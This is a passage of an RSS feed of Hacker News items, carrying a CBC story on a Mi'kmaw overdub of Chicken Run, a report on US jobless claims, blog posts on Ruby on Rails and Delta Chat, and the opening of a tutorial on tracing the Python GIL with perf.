copies.</p>  <p>"Parents were coming up to us and saying, 'You know, my child is speaking Mi'kmaw ... They're watching<em> Chicken Run</em> all day. They're watching it on repeat and they're starting to speak Mi'kmaw,'" said Tom Johnson.</p>  <p><em><strong>LISTEN | Carol Anne and Tom Johnson explain their overdub of Chicken Run:</strong></em></p>  <p><span><span><div><div role="button" tabindex="0" title="Eskasoni family overdubs Chicken Run in Mi'kmaw"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/48/947/InfoMorn_CapeBreton_640x360.jpg" alt=""></p><p><span>Information Morning - Cape Breton</span><span>8:12</span><span>Eskasoni family overdubs Chicken Run in Mi'kmaw</span></p></div></div></div><span>Remember the kids movie Chicken Run?  We look into a particularly Cape Breton phenomenon: Chicken Run, overdubbed in Mi'kmaw.  Reporter Holly Conners spoke to Tom and Carol Anne Johnson about how their family overdubbed the blockbuster to expose young people in Eskasoni, and beyond, to the Mi'kmaq language.<!-- --> <!-- -->8:12</span></span></span></p>  <p>Tom voices one of the main characters, a rooster named Rocky,&nbsp;who falls in love with Ginger&nbsp;the hen, voiced by Carol Anne.&nbsp;</p>  <p>Carol Anne said that people will often remark on their voices when they see the couple on the street.</p>  <p>"People stop us and say, 'Oh my God&nbsp; .... all I can hear is Rocky,'" Carol Anne laughed. "And of course, [Tom will] stop and he'll do his Rocky voice."</p>    <h2>Preserving a language</h2>  <p>Tom grew up speaking Mi'kmaw&nbsp;and he worries about&nbsp;the future of the language. He said the number of speakers in Eskasoni alone has dropped drastically since the 1980s.</p>  <p>Still, he said there's a lot of work being done to try to keep the oral language alive. He points to the efforts of staff at the Eskasoni&nbsp;Immersion School and a&nbsp;YouTube channel he created&nbsp;<a href="https://www.youtube.com/user/MikmaqMusic/featured" target="_blank">to share Mi'kmaw music.</a></p>  <p>"This was something that was never seen before," Tom&nbsp;said.&nbsp;"You have these animated characters speaking the language and it sparked interest amongst the younger generation."&nbsp;</p>  <p>Carol Anne said the family reached out to Dreamworks, the studio that owns the rights to the film,&nbsp;asking for permission several years ago, but they never heard back. She figures that's a good sign.</p>  <p><em><strong>WATCH | A scene in Chicken Run overdubbed in Mi'kmaw:</strong></em></p>  <p><span><span><div><div title="A scene from Chicken Run overdubbed in Mi'kmaw" role="button" tabindex="0"><div><div aria-labelledby="1843854915504-metadata-" title="A scene from Chicken Run overdubbed in Mi'kmaw"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/230/78/chicken_run.png" alt="" loading="lazy"></p></div></div></div></div></div></span></span></p>  <p>The family's foray into voice acting began&nbsp;as a way to bring joy to Tom&nbsp;and Carol Anne's&nbsp;son, also named&nbsp;Tom,&nbsp;many years ago. He was about four years old when his twin sister died.&nbsp;</p>  <p>Tom Sr.'s brother decided to get the family together to overdub&nbsp;<em>Gordy</em>, a&nbsp;1995 Disney movie about a pig,&nbsp;in Mi'kmaw.</p>  <p>"He wanted [his nephew]&nbsp;to be able to see a movie in his language, because at the age of four, for the most part, he spoke Mi'kmaw," Carol Anne said. "And he thought it was very funny to see all these animals speaking Mi'kmaw."</p>  <p>Tom's brother suggested the family's next project should be <em>Chicken Run, </em>and the&nbsp;idea took on a life of its own after that.</p>  <h2>Project took 6 weeks</h2>  <p>Tom and Carol Anne began&nbsp;spending up to eight hours every night around a microphone in their garage, which&nbsp;was also a recording studio. The entire project took about six weeks.&nbsp;</p>  <p>"Once we started, we couldn't stop," said Carol Anne. "We even asked some of our children to come in, make some cameos. We had my niece in there&nbsp;as well."</p>    <p>It was tedious and time-consuming work&nbsp;to match up the syllables in Mi'kmaw with the&nbsp;movement of the characters' mouths, but Tom said it was fun, too.&nbsp;</p>  <p>"We got a big kick out of seeing cartoons speaking Mi'kmaw, and we couldn't stop laughing," he said. "We said, 'Wow, this would be fun for our people.'"</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>We got a big kick out of seeing cartoons speaking Mi'kmaw, and we couldn't stop laughing.<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Tom Johnson, Eskasoni</cite></span></blockquote>    <p>In the end,&nbsp;their overdubbed version is&nbsp;not a literal translation, but tries&nbsp;to capture the essence of what the characters said while also throwing in humour and references that Mi'kmaw speakers would enjoy.</p>  <p>In&nbsp;a couple of scenes, you can hear Mi'kmaw music in the background, including from Tom's band, The Relatives.&nbsp;</p>  <p>"That's why it was so successful, because everything in there is very relatable," Carol Anne said.&nbsp;</p>  <h2>'We need more stuff like this'</h2>  <p>Starr&nbsp;Paul, a Mi'kmaw language educator from Eskasoni, remembers watching the film for the first time during a viewing at the high school.</p>  <p>"I was taken aback. I was like, 'Oh my god,&nbsp;that's so awesome.&nbsp;We need more stuff like this,'" she said.&nbsp;&nbsp;</p>  <p><em><strong>WATCH | A look inside a Mi'kmaw Immersion School in Nova Scotia:</strong></em></p>  <p><span><span><div><div title="Visit this Mi'kmaq immersion school in Nova Scotia" role="button" tabindex="0"><div><div aria-labelledby="1186888771957-metadata-" title="Visit this Mi'kmaq immersion school in Nova Scotia"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/386/347/Beyond94_ESK_Thumb.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Eskasoni, N.S., is taking steps to preserve its Indigenous language among the next generation<!-- --> <!-- -->10:50</span></span></span></p>  <p>Paul brought a copy of the Johnsons' version of&nbsp;<em>Chicken Run</em>&nbsp;to her in-laws in New Brunswick, who loved it. She said social media has made sure its legacy lives on.</p>  <p>"Sometimes you hear people say, 'Anybody&nbsp;have a copy of Mi'kmaw <em>Chicken Run?'&nbsp;</em>So it wasn't just throughout Eskasoni — it was throughout everywhere. It was a huge hit," she said.</p>  <p>Paul has&nbsp;been teaching Mi'kmaw&nbsp;immersion for more than 20 years and said in the early days, educators had to create most of their own teaching materials.</p>  <p>"We had to translate stuff. We had to transcribe and we had all these different methods of trying to put down the words for [the students] to learn," she said.</p>  <p>These days, technology has made some of that work&nbsp;easier, but Paul wishes there were more resources like Mi'kmaw <em>Chicken Run</em>.</p>  <p>She's&nbsp;eager for Tom and Carol Anne to overdub another movie, but they're not sure they're ready to put in that kind of time and effort again.</p>  <p>"It almost became like a labour of love, really, and we're not quitters, so we wanted to see it to the end," said Carol Anne.&nbsp;"We're just honoured that it was shared like that, so it became bigger than us, that's for sure."</p>  </span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/nova-scotia/eskasoni-mi-kmaw-language-overdubb-chicken-run-johnson-family-1.5871741</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778299</guid>
            <pubDate>Thu, 14 Jan 2021 16:29:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. jobless numbers surge as worsening Covid-19 pandemic hurts businesses]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 85 (<a href="https://news.ycombinator.com/item?id=25778289">thread link</a>) | @heyheyheysome
<br/>
January 14, 2021 | https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The number of Americans filing first-time applications for unemployment benefits surged last week, confirming a weakening in labour market conditions as a worsening COVID-19 pandemic disrupts operations at restaurants and other businesses.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5872837.1610635730!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/usa-smallbusiness-ppp.JPG"></p></div><figcaption>A woman walks past a business that is closing in New York City in August. Initial claims for state unemployment benefits totalled a seasonally adjusted 965,000 for the week ended Jan. 9, compared to 784,000 in the prior week, the U.S. Labour Department said on Thursday.<!-- --> <!-- -->(Carlo Allegri/Reuters)</figcaption></figure><p><span><p>The number of Americans filing first-time applications for unemployment benefits surged last week, confirming a weakening in labour market conditions as a worsening COVID-19 pandemic disrupts operations at restaurants and other businesses.</p>  <p>Initial claims for state unemployment benefits totalled a seasonally adjusted 965,000 for the week ended Jan. 9, compared to 784,000 in the prior week, the U.S. Labour Department said on Thursday. Economists polled by Reuters had forecast 795,000 applications in the latest week.</p>  <p>It's the highest number since late August.&nbsp;Applications declined over the summer but have been stuck above 700,000 since September.</p>  <p>Claims were also likely lifted by re-applications for benefits following the government's renewal of a $300 US unemployment supplement until March 14 as part of nearly $900 billion in additional relief approved at the end of December.</p>    <p>Government-funded programs for the self-employed, gig workers and others who do not qualify for the state unemployment programs as well as those who have exhausted their benefits were also extended.</p>  <p>Authorities in many states have banned indoor dining to slow the spread of the coronavirus. The economy shed jobs in December for the first time in eight months.</p>  <p>The Federal Reserve's Beige Book report of anecdotal information on business activity collected from contacts nationwide in early January showed on Wednesday that "contacts in the leisure and hospitality sectors reported renewed employment cuts due to stricter containment measures."</p>  <p>The central bank also noted that the resurgence in the coronavirus was causing staff shortages in the manufacturing, construction and transportation&nbsp;sectors.</p>  <h2>Most infections of any country</h2>  <p>The virus has infected more than 22.5 million people in the United States and killed over 376,188, the most of any country.&nbsp;More than 4,300 deaths were reported Tuesday, a&nbsp;record high.</p>  <p>Though jobless claims have dropped from a record 6.867 million in March, they remain above their 665,000 peak during the 2007-09 Great Recession. Economists say it could take several years for the labour market to recover from the pandemic.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/health-coronavirus-usa-florida.JPG 300w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/health-coronavirus-usa-florida.JPG 460w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/health-coronavirus-usa-florida.JPG 620w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/health-coronavirus-usa-florida.JPG 780w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/health-coronavirus-usa-florida.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/health-coronavirus-usa-florida.JPG"></p></div><figcaption>Hundreds wait in line to receive the COVID-19 vaccine in Fort Myers, Fla., in late December. Economists are hopeful the economy will turn around in late 2021.<!-- --> <!-- -->(Andrew West/The News-Press/USA Today Network/Reuters)</figcaption></figure></span></p>  <p>"While prospects for the economy later in 2021 are upbeat, the labour market recovery has taken a step backward," said Nancy Vanden Houten, an economist at Oxford Economics, "and we expect claims to remain elevated, with the risk that they rise from last week's levels."</p>  <p>Last week's applications for aid might have been elevated in part because state employment offices had been closed over the holidays, requiring some jobless people to wait until last week to apply.&nbsp;</p>  <h2>5.3 million Americans receiving jobless benefits</h2>  <p>In addition to last week's first-time applications for unemployment aid, the government said Thursday that 5.3 million Americans are continuing to receive state jobless benefits, up from 5.1 million in the previous week. It suggests that fewer people who are out of work are finding jobs.</p>  <p>About 11.6 million people received jobless aid from two federal programs in the week that ended Dec. 26, the latest period for which data is available. One of those programs provides extended benefits to people who have exhausted their state aid. The other supplies benefits to self-employed and contract workers.</p>  <p>Those two programs had expired near the end of December. They were belatedly renewed, through mid-March, in the $900-billion rescue aid package that Congress approved and President Donald Trump signed into law. That legislation also included $600 relief cheques&nbsp;for most adults and a supplemental unemployment benefit payment of $300 a week. Congressional Democrats favour boosting the cheques&nbsp;to $2,000 and extending federal aid beyond March, as does president-elect Joe Biden.</p>    <p>The U.S. job market's weakness was made painfully clear in the December employment report that the government issued last week. Employers shed jobs for the first time since April as the pandemic tightened its grip on consumers and businesses.</p>  <p>The figures also depicted a sharply uneven job market: The losses last month were concentrated among restaurants, bars, hotels and entertainment venues. Educational services, mostly colleges and universities, also cut workers in December. So did film and music studios.</p>  <p>Most other large industries, though, reported job gains. Many economists had expected last spring that job losses would spread to more industries. Though all sectors of the economy initially laid off workers, most of them have avoided deep job cuts. Manufacturing, construction, and professional services like engineering and architecture, for example, all added jobs in December.</p>  <p>At the same time, many companies seem reluctant to sharply ramp up hiring. A government report Tuesday showed that employers advertised fewer open jobs in November than in October. The decline, while small, was widespread across most industries.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778289</guid>
            <pubDate>Thu, 14 Jan 2021 16:28:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is RoR Dead?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778256">thread link</a>) | @Damix
<br/>
January 14, 2021 | https://themasters.io/blog/posts/is-ruby-on-rails-already-dead | <a href="https://web.archive.org/web/*/https://themasters.io/blog/posts/is-ruby-on-rails-already-dead">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span>On the other hand, just think about how much has changed in technology in the last six years - how is it even possible that a technology which was reported as dead in the water around 2013 is still being written about in 2021? <strong>Is RoR in fact dead, or is it an Internet myth?</strong></span></p>
<p><span>If you're a business owner looking to improve your existing Ruby on Rails app, or if you're looking to build a web app from scratch, it's all very confusing. Here's what you really need to know about Ruby on Rails app development in the real world.</span></p>
<h3><strong>Which well-known companies use Ruby on Rails for big projects?</strong></h3>
<p><strong><img src="https://themasters.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbVlFIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5cd3ce3180244c8adb5f0490d6e04f86d2074b76/ruby-on-rails-framework.jpg" alt="Ruby on rails framework" width="500" height="262"></strong></p>
<h4>
<span><strong>Basecamp</strong> <strong>â€“ software for project management/team communications</strong><br></span><span>In fact, Ruby on Rails was born at Basecamp, because they took an existing web application, and extracted the best parts to create the ultimate MVC framework. And right now Basecamp runs on half a dozen platforms, including native mobile apps, with RoR still acting as their preferred backend.</span>
</h4>
<h4>
<strong>GitHub â€“ the biggest code repository in the worldÂ&nbsp;<br></strong><span>On a side-note, RoR includes several features designed specifically to improve application performance. One such feature, Turbolinks, descends from an approach called pjax, which was actually developed at GitHub.</span>
</h4>
<p><strong>And the list of other well-known companies using RoR continues with:<br></strong></p>
<ul>
<li><span><strong>AirBnB</strong> - they've been using Ruby on Rails since they first started up,</span></li>
<li><span><strong>Crunchbase</strong> - tells you who stands behind innovative companies,</span></li>
<li><span><strong>Dribbble</strong> - a showcase for the world's top design professionals,</span></li>
<li><span><strong>Groupon</strong> - ecommerce marketplace providing special offers and discounts on products and services</span></li>
<li><span><strong>Kickstarter</strong> - crowdsourcing service,</span></li>
<li><span><strong>Pixlr</strong> - photo editing web application,</span></li>
<li><span><strong>Shopify</strong> - huge ecommerce software platform, and</span></li>
<li><span><strong>SlideShare</strong> - hosting service for professional content.</span></li>
</ul>
<p>Just by looking at the short list of use-cases above, you can see that many, quite different types of web applications are run on RoR.</p>
<h3><strong>How about performance?</strong></h3>
<p><span>As you can see from the list above of <strong>big companies using RoR</strong>, experienced RoR developers can already maximise performance by leveraging:<br></span></p>
<ul>
<li><span>the asset pipeline, which uses several strategies to reduce the number of requests the web browser makes for assets,</span></li>
<li><span>Turbolinks, which maintain a permanent process (just like single-page applications do), so that CSS and JavaScript don't need to be reinitialized and reapplied to the page again,</span></li>
<li><span>techniques to reduce the number of database queries your application makes and improve the performance of slow queries, and</span></li>
<li><span>storing frequently used data so that further requests for the same data will be faster (low-level caching and fragment caching).</span></li>
</ul>
<p><span>How about the performance of the Ruby language itself? Ruby's inventor, Yukihiro â€œMatzâ€� Matsumoto, has stated his clear intention to make Ruby 3.0 three times faster than Ruby 2.0. He aims to achieve this by improving both memory performance and CPU performance. </span></p>
<p><img title="Ruby on Rails app development" src="https://themasters.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbVVFIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--b2c31ec958710b208fb1b697ab5fdac13895f74f/ruby-on-rails-developer.jpg" alt="senior programmer working on ruby on rails code" width="600" height="400"></p>
<h3><strong>Why do programmers like RoR?</strong></h3>
<p><span>RoR is an integrated system that collapses as many unnecessary conceptual models as possible using principles like Don't Repeat Yourself (DRY), convention-over-configuration, and English-like semantics. In turn, this leads to simplicity and clarity, which translates to progress at speed.<strong> In short, this allows a programmer to write code that not only makes her smile while she writes it, but also makes a different programmer smile when he later has to extend or patch it.</strong></span></p>
<p><span>From a business perspective, it really isn't a good idea to use a programming language which is the next cool thing on the block. Nope, you'll want to invest in a complete ecosystem which is mature, stable, predictable, reliable, and scales well . Whilst RoR is mature technology it is not stagnant, but it is rather constantly evolving, and that is thanks to all those who actively contribute to its great community. The chances are that, if developers get stuck at any time when developing a particular functionality, there is a ready-to-use gem for it in the massive library of Ruby gems.</span></p>
<h3><strong>Why do businesses like RoR?</strong></h3>
<p><span>With RoR, skilful, experienced developers are more productive, that is, they can do <strong>more, faster, and more cost-effectively.</strong> This also means that both the business team and the developers can focus together on business features and complex application logic. In reality, this means that you can fully focus on creating a web app which encapsulates whatever differentiates your business from other businesses.</span></p>
<p><span>It's funny, but you almost never see books or articles about how to develop with RoR in an agile way - it's as if <strong>the agile development process is already part of RoR's DNA.</strong> RoR wins out precisely because it makes it as easy as possible to quickly make a change, and then test that change â€¦ time after time.</span></p>
<h3><strong>What is RoR not good for?</strong></h3>
<p><span>We prefer to be honest, and state clearly that RoR is not really a good option for the following edge-cases:</span></p>
<ul>
<li><span>Simple, static websites â€“ in this case, RoR is over-kill.</span></li>
<li><span>Websites which require only a few function calls to a simple backend.</span></li>
<li><span>Micro/services oriented architecture (M/SOA) - sooner rather than later, this pattern requires large maintenance teams.</span></li>
</ul>
<h3><span><strong>So what is RoR good for?</strong></span></h3>
<p><span>RoR is highly suitable for the vast majority of web applications, in particular:</span></p>
<ul>
<li><span>when you need a quick prototype (MVP),</span></li>
<li><span>any application for which you do not yet have a fixed concept, but you're looking for a framework which will allow you to later expand and pivot, as your business needs change,</span></li>
<li><span>standard web applications,</span></li>
<li><span>eCommerce applications,</span></li>
<li><span>custom database solutions, and</span></li>
<li><span>web applications which also leverage some specialist areas, such as Machine Learning or Blockchain - in this case, RoR is ideal in providing a high-performance framework, but connecting to algorithms written in some other language.</span></li>
</ul>
<p><span>With its focus on productivity, versatility, and stability at scale it's clear that <strong>RoR will be a great choice for developing most web applications for the foreseeable future.</strong></span></p>

</div></div>]]>
            </description>
            <link>https://themasters.io/blog/posts/is-ruby-on-rails-already-dead</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778256</guid>
            <pubDate>Thu, 14 Jan 2021 16:26:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Email is the messenger you should migrate to]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25778233">thread link</a>) | @jlelse
<br/>
January 14, 2021 | https://jlelse.blog/posts/email-messenger-delta-chat | <a href="https://web.archive.org/web/*/https://jlelse.blog/posts/email-messenger-delta-chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">✍️ Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don’t have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don’t even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>– <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn’t quite mature 2 years ago, I have to say it’s pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don’t use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:
<a rel="tag" href="https://jlelse.blog/tags/delta-chat">Delta Chat</a>
<a rel="tag" href="https://jlelse.blog/tags/email">Email</a>
<a rel="tag" href="https://jlelse.blog/tags/messenger">Messenger</a>
<a rel="tag" href="https://jlelse.blog/tags/opinion">Opinion</a></p></article></div></div>]]>
            </description>
            <link>https://jlelse.blog/posts/email-messenger-delta-chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778233</guid>
            <pubDate>Thu, 14 Jan 2021 16:24:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracing the Python GIL]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25777423">thread link</a>) | @mariuz
<br/>
January 14, 2021 | https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html | <a href="https://web.archive.org/web/*/https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>

<p>There are plenty of articles explaining why the Python GIL (The Global Interpreter Lock) exists<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and why it is there. The TLDR version is: the GIL prevents multithreaded pure Python code from using multiple CPU cores.</p>
<p>However, in <a href="https://vaex.io/">Vaex</a> we execute most of the CPU intensive parts in C (C++) code, where we release the GIL. This is a common practice in high-performance Python libraries, where Python acts merely as a high-level glue.</p>
<p>However, the GIL needs to be released explicitly, and this is the responsibility of the programmer and might be forgotten, leading to suboptimal use of your machine.</p>
<p>I recently had this issue in <a href="https://github.com/vaexio/vaex/pull/1114">Vaex</a> where I simply forgot to release the GIL and found a similar issue in <a href="https://github.com/apache/arrow/pull/7756">Apache Arrow</a><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Also, when running on 64 cores, I sometimes see a performance in Vaex that I am not happy with. It might be using 4000% CPU, instead of 6400% CPU, which is something I am not happy with. Instead of blindly pulling some levers to inspect the effect, I want to understand what is happening, and if the GIL is the problem, why, and where is it holding Vaex down.</p>


</div>
</div>
</div><div>
<div>
<div>

<p>I'm planning to write a series of articles explaining some tools and techniques available for profiling/tracing Python together with native extensions, and how these tools can be glued together, to analyze and visualize what Python is doing, and when the GIL it taken or dropped.</p>
<p>I hope this leads to improvement of tracing, profiling, and other performance tooling in the Python ecosystem, and the performance of the whole Python ecosystem.</p>

<h2 id="Linux">
Linux<a href="#Linux"> </a>
</h2>
<p>Get access to a Linux machine, and make sure you have root privileges (sudo is fine), or ask your sysadmin to execute some of these commands for you. For the rest of the document, we only run as user.</p>
<h2 id="Perf">
Perf<a href="#Perf"> </a>
</h2>
<p>Make sure you have perf installed, e.g. on Ubuntu:</p>

<pre><code>$ sudo yum install perf</code></pre>
<h2 id="Kernel-configuration">
Kernel configuration<a href="#Kernel-configuration"> </a>
</h2>
<p>To enable running it as a user:</p>

<pre><code># Enable users to run perf (use at own risk)
$ sudo sysctl kernel.perf_event_paranoid=-1

# Enable users to see schedule trace events:
$ sudo mount -o remount,mode=755 /sys/kernel/debug
$ sudo mount -o remount,mode=755 /sys/kernel/debug/tracing</code></pre>
<h2 id="Python-packages">
Python packages<a href="#Python-packages"> </a>
</h2>
<p>We will make use of <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> and <a href="https://github.com/maartenbreddels/per4m">per4m</a></p>

<pre><code>$ pip install "viztracer&gt;=0.11.2" "per4m&gt;=0.1,&lt;0.2"</code></pre>

</div>
</div>
</div><div>
<div>
<div>

<p>There is no way to get the GIL state in Python <sup id="fnref-3"><a href="#fn-3">1</a></sup> since there is no API for this. We can track it from the kernel, and the right tool for this under Linux is <strong>perf</strong>.</p>
<p>Using the linux perf tool (aka perf_events), we can listen to the state changes for processes/threads (we only care about sleeping and running), and log them. Although perf may look scary, it is a powerful tool. If you want to know a bit more about perf, I recommend reading <a href="https://jvns.ca/blog/2018/04/16/new-perf-zine/">Julia Evans' zine on perf</a> or <a href="http://www.brendangregg.com/perf.html">go through Brendan Gregg's website</a>.</p>
<p>To build our intuition, we will first run perf on a <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example0.py">very trivial program</a>:</p>


</div>
</div>
</div><div>
<div>
<div>
<p>We listen to just a few events to keep the noise down (note the use of wildcards):</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork \
        -e 'sched:sched_wak*' -- python -m per4m.example0
[ perf record: Woken up 2 times to write data ]
[ perf record: Captured and wrote 0,032 MB perf.data (33 samples) ]</code></pre>
<p>And use the <code>perf script</code> command to write human/parsable output.</p>

<pre><code>$ perf script
        :3040108 3040108 [032] 5563910.979408:                sched:sched_waking: comm=perf pid=3040114 prio=120 target_cpu=031
        :3040108 3040108 [032] 5563910.979431:                sched:sched_wakeup: comm=perf pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995616:                sched:sched_waking: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995618:                sched:sched_wakeup: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995621:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995622:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995624:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R+ ==&gt; next_comm=kworker/31:1 next_pid=2502104 next_prio=120
          python 3040114 [031] 5563911.003612:                sched:sched_waking: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
